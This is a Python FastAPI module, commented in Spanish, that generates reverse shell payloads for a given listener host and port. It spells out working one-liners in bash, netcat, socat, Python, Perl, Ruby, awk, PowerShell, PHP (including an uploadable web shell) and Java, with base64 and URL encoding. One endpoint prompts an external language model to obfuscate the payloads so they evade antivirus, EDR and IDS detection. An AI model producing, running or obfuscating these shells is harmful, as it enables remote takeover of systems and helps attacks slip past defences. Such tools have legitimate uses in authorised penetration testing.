"""
reverse_shell.py — Reverse Shell Generator
Genera payloads de reverse shell en múltiples lenguajes + obfuscación IA (Groq)
"""
import base64
import httpx
from fastapi import APIRouter
from fastapi.responses import JSONResponse
from pydantic import BaseModel
from typing import Optional

router = APIRouter()

# ─── Modelos ──────────────────────────────────────────────────────────────────

class RevShellRequest(BaseModel):
    lhost: str
    lport: int = 4444
    language: str = "bash"
    encoding: str = "none"  # none | base64 | url
    groq_key: Optional[str] = None
    obfuscate: bool = False

# ─── Templates de payloads ────────────────────────────────────────────────────

def _get_raw_payload(language: str, lhost: str, lport: int) -> dict:
    """Devuelve el payload crudo y metadatos según el lenguaje seleccionado."""

    shells = {

        # ── Linux / Unix ─────────────────────────────────────────────────────

        "bash": {
            "label": "Bash TCP",
            "os": "Linux",
            "category": "Shell",
            "payload": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "listener": f"nc -lvnp {lport}",
            "description": "Reverse shell clásica usando /dev/tcp de bash. Funciona en la mayoría de sistemas Linux.",
        },
        "bash_196": {
            "label": "Bash 196",
            "os": "Linux",
            "category": "Shell",
            "payload": f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196",
            "listener": f"nc -lvnp {lport}",
            "description": "Variante con descriptor de archivo explícito. Útil cuando bash -i falla.",
        },
        "bash_udp": {
            "label": "Bash UDP",
            "os": "Linux",
            "category": "Shell",
            "payload": f"sh -i >& /dev/udp/{lhost}/{lport} 0>&1",
            "listener": f"nc -u -lvnp {lport}",
            "description": "Shell inversa sobre UDP. Puede evadir firewalls que filtran TCP.",
        },
        "netcat": {
            "label": "Netcat",
            "os": "Linux/Mac",
            "category": "Shell",
            "payload": f"nc -e /bin/sh {lhost} {lport}",
            "listener": f"nc -lvnp {lport}",
            "description": "Netcat con -e. Requiere que nc tenga la opción -e compilada (netcat-traditional).",
        },
        "netcat_mkfifo": {
            "label": "Netcat FIFO",
            "os": "Linux",
            "category": "Shell",
            "payload": f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {lhost} {lport} >/tmp/f",
            "listener": f"nc -lvnp {lport}",
            "description": "Netcat sin -e usando named pipe. Funciona con versiones de nc que no soportan -e.",
        },
        "socat": {
            "label": "Socat TTY",
            "os": "Linux",
            "category": "Shell",
            "payload": f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}",
            "listener": f"socat file:`tty`,raw,echo=0 tcp-listen:{lport}",
            "description": "Shell completamente interactiva con TTY. La mejor opción si socat está disponible.",
        },
        "python3": {
            "label": "Python 3",
            "os": "Linux/Mac",
            "category": "Scripting",
            "payload": (
                f"python3 -c 'import socket,subprocess,os;"
                f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                f"s.connect((\"{lhost}\",{lport}));"
                f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                f"subprocess.call([\"/bin/sh\",\"-i\"])'"
            ),
            "listener": f"nc -lvnp {lport}",
            "description": "Shell en Python 3. Portable y confiable, disponible en casi todos los sistemas modernos.",
        },
        "python2": {
            "label": "Python 2",
            "os": "Linux",
            "category": "Scripting",
            "payload": (
                f"python -c 'import socket,subprocess,os;"
                f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                f"s.connect((\"{lhost}\",{lport}));"
                f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                f"subprocess.call([\"/bin/sh\",\"-i\"])'"
            ),
            "listener": f"nc -lvnp {lport}",
            "description": "Variante para sistemas con Python 2 (legacy).",
        },
        "perl": {
            "label": "Perl",
            "os": "Linux/Mac",
            "category": "Scripting",
            "payload": (
                f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
                f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
                f"open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
            ),
            "listener": f"nc -lvnp {lport}",
            "description": "Shell en Perl. Disponible en muchos sistemas Unix por defecto.",
        },
        "ruby": {
            "label": "Ruby",
            "os": "Linux/Mac",
            "category": "Scripting",
            "payload": (
                f"ruby -rsocket -e 'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;"
                f"exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
            ),
            "listener": f"nc -lvnp {lport}",
            "description": "Shell en Ruby. Útil en entornos Rails o donde Ruby esté instalado.",
        },
        "awk": {
            "label": "AWK",
            "os": "Linux",
            "category": "Shell",
            "payload": (
                f"awk 'BEGIN {{s = \"/inet/tcp/0/{lhost}/{lport}\"; "
                f"while(42) {{ do {{ printf \"shell>\" |& s; s |& getline c; "
                f"if(c) {{ while ((c |& getline) > 0) print |& s; close(c) }} }} "
                f"while(c != \"exit\") }} }}'"
            ),
            "listener": f"nc -lvnp {lport}",
            "description": "Shell usando awk GAWK. Muy útil para evadir restricciones ya que awk rara vez está bloqueado.",
        },

        # ── Windows ──────────────────────────────────────────────────────────

        "powershell": {
            "label": "PowerShell",
            "os": "Windows",
            "category": "Windows",
            "payload": (
                f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
                f"\"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
                f"$stream = $client.GetStream();"
                f"[byte[]]$bytes = 0..65535|%{{0}};"
                f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
                f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
                f"$sendback = (iex $data 2>&1 | Out-String);"
                f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
                f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
                f"$stream.Write($sendbyte,0,$sendbyte.Length);"
                f"$stream.Flush()}};"
                f"$client.Close()\""
            ),
            "listener": f"nc -lvnp {lport}",
            "description": "Shell PowerShell con bypass de ExecutionPolicy. Estándar en pentesting Windows.",
        },
        "powershell_b64": {
            "label": "PowerShell Base64",
            "os": "Windows",
            "category": "Windows",
            "payload": "",  # Se genera dinámicamente abajo
            "listener": f"nc -lvnp {lport}",
            "description": "PowerShell en Base64 con EncodedCommand. Evita problemas de caracteres especiales en la línea de comandos.",
            "_template_lhost": lhost,
            "_template_lport": lport,
        },
        "cmd_nc": {
            "label": "CMD + Netcat",
            "os": "Windows",
            "category": "Windows",
            "payload": f"nc.exe -e cmd.exe {lhost} {lport}",
            "listener": f"nc -lvnp {lport}",
            "description": "Netcat para Windows con -e. Requiere nc.exe en el objetivo.",
        },

        # ── Web Shells ────────────────────────────────────────────────────────

        "php": {
            "label": "PHP",
            "os": "Linux/Windows",
            "category": "Web",
            "payload": (
                f"php -r '$sock=fsockopen(\"{lhost}\",{lport});"
                f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
            ),
            "listener": f"nc -lvnp {lport}",
            "description": "Shell PHP usando fsockopen. Funciona en servidores web con PHP.",
        },
        "php_web": {
            "label": "PHP Web Shell",
            "os": "Linux/Windows",
            "category": "Web",
            "payload": (
                f"<?php\n"
                f"$sock = fsockopen(\"{lhost}\", {lport});\n"
                f"$proc = proc_open('/bin/sh -i', [\n"
                f"  0 => $sock,\n"
                f"  1 => $sock,\n"
                f"  2 => $sock\n"
                f"], $pipes);\n"
                f"?>"
            ),
            "listener": f"nc -lvnp {lport}",
            "description": "Web shell PHP para subir como archivo .php. Establece shell inversa al acceder.",
        },
        "java": {
            "label": "Java",
            "os": "Linux/Windows",
            "category": "Scripting",
            "payload": (
                f"r = Runtime.getRuntime();"
                f"p = r.exec(new String[]{{\"cmd.exe\",\"/c\",\"nc.exe -e cmd.exe {lhost} {lport}\"}});"
                f"p.waitFor();"
            ),
            "listener": f"nc -lvnp {lport}",
            "description": "Shell Java usando Runtime.exec(). Útil en aplicaciones Java/JSP vulnerables.",
        },
    }

    data = shells.get(language)
    if not data:
        return {"error": f"Lenguaje '{language}' no soportado"}

    # Generar PowerShell Base64 dinámicamente
    if language == "powershell_b64":
        ps_inner = (
            f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
            f"$stream = $client.GetStream();"
            f"[byte[]]$bytes = 0..65535|%{{0}};"
            f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
            f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
            f"$sendback = (iex $data 2>&1 | Out-String);"
            f"$sendback2 = $sendback + 'PS '+(pwd).Path+'> ';"
            f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};"
            f"$client.Close()"
        )
        encoded = base64.b64encode(ps_inner.encode("utf-16-le")).decode()
        data["payload"] = f"powershell -EncodedCommand {encoded}"

    return data


def _apply_encoding(payload: str, encoding: str, language: str) -> str:
    """Aplica codificación adicional al payload."""
    if encoding == "base64":
        if language in ("bash", "bash_196", "netcat", "netcat_mkfifo", "awk"):
            b64 = base64.b64encode(payload.encode()).decode()
            return f"echo {b64} | base64 -d | bash"
        elif language.startswith("python"):
            b64 = base64.b64encode(payload.encode()).decode()
            inner = payload.replace("python3 -c '", "").replace("python -c '", "").rstrip("'")
            inner_b64 = base64.b64encode(inner.encode()).decode()
            py_ver = "python3" if language == "python3" else "python"
            return f"{py_ver} -c \"import base64,exec; exec(base64.b64decode('{inner_b64}').decode())\""
        else:
            b64 = base64.b64encode(payload.encode()).decode()
            return f"# Base64: {b64}\necho '{b64}' | base64 -d | bash"
    elif encoding == "url":
        import urllib.parse
        return urllib.parse.quote(payload)
    return payload


# ─── Endpoint: generar payload ────────────────────────────────────────────────

@router.post("/api/revshell/generate")
async def generate_revshell(req: RevShellRequest):
    data = _get_raw_payload(req.language, req.lhost, req.lport)
    if "error" in data:
        return JSONResponse(status_code=400, content=data)

    payload = _apply_encoding(data["payload"], req.encoding, req.language)

    result = {
        "language":    req.language,
        "label":       data.get("label", req.language),
        "os":          data.get("os", ""),
        "category":    data.get("category", ""),
        "description": data.get("description", ""),
        "payload":     payload,
        "payload_raw": data["payload"],
        "listener":    data.get("listener", f"nc -lvnp {req.lport}"),
        "encoding":    req.encoding,
        "obfuscated":  False,
        "obfuscated_payload": None,
    }

    # Obfuscación IA con Groq
    if req.obfuscate and req.groq_key:
        try:
            obf = await _groq_obfuscate(req.groq_key, payload, req.language, req.lhost, req.lport)
            result["obfuscated"] = True
            result["obfuscated_payload"] = obf
        except Exception as e:
            result["obfuscation_error"] = str(e)

    return JSONResponse(content=result)


# ─── Endpoint: listar lenguajes disponibles ───────────────────────────────────

@router.get("/api/revshell/languages")
async def list_languages():
    languages = []
    for key in [
        "bash", "bash_196", "bash_udp",
        "netcat", "netcat_mkfifo", "socat",
        "python3", "python2", "perl", "ruby", "awk",
        "powershell", "powershell_b64", "cmd_nc",
        "php", "php_web", "java",
    ]:
        d = _get_raw_payload(key, "LHOST", 4444)
        if "error" not in d:
            languages.append({
                "id":       key,
                "label":    d.get("label", key),
                "os":       d.get("os", ""),
                "category": d.get("category", ""),
            })
    return JSONResponse(content={"languages": languages})


# ─── Obfuscación con Groq ─────────────────────────────────────────────────────

async def _groq_obfuscate(api_key: str, payload: str, language: str, lhost: str, lport: int) -> str:
    """Pide a Groq que obfusque el payload manteniendo la funcionalidad."""
    system = (
        "Eres un experto en seguridad ofensiva y obfuscación de código para pentesting legítimo. "
        "Tu tarea es obfuscar el payload proporcionado para evadir detección por AV/EDR/IDS, "
        "manteniendo exactamente la misma funcionalidad. "
        "Responde SOLO con el payload obfuscado, sin explicaciones, sin markdown, sin bloques de código. "
        "Solo el comando/código obfuscado listo para usar."
    )
    prompt = (
        f"Obfusca este payload de reverse shell en {language} para que conecte a {lhost}:{lport}. "
        f"Usa técnicas como: variables intermedias, concatenación de strings, codificación, "
        f"redirecciones alternativas, o equivalentes funcionales. "
        f"Mantén el lenguaje original ({language}).\n\n"
        f"PAYLOAD ORIGINAL:\n{payload}"
    )

    import httpx
    async with httpx.AsyncClient(timeout=30) as client:
        resp = await client.post(
            "https://api.groq.com/openai/v1/chat/completions",
            headers={"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"},
            json={
                "model": "llama-3.3-70b-versatile",
                "max_tokens": 600,
                "temperature": 0.3,
                "messages": [
                    {"role": "system", "content": system},
                    {"role": "user",   "content": prompt},
                ],
            },
        )
    data = resp.json()
    return data["choices"][0]["message"]["content"].strip()


# ─── Registro de rutas ────────────────────────────────────────────────────────

def register_revshell_routes(app):
    app.include_router(router)
